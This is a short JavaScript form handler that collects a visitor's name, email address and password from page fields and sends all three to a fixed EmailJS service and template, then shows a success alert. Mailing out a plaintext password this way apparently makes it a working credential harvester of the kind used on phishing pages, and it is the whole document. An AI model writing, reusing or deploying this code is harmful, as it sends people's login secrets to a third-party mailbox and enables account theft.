function sendEmail() {
    let params = {
      from_name: document.getElementById('text').value,
      email: document.getElementById('email').value,
      password: document.getElementById('password').value,
    }
    emailjs.send("service_8lbi3mi","template_fz3hjdm", params).then(function (res) {
      alert('Successfullly sent! ' + res.status);
})}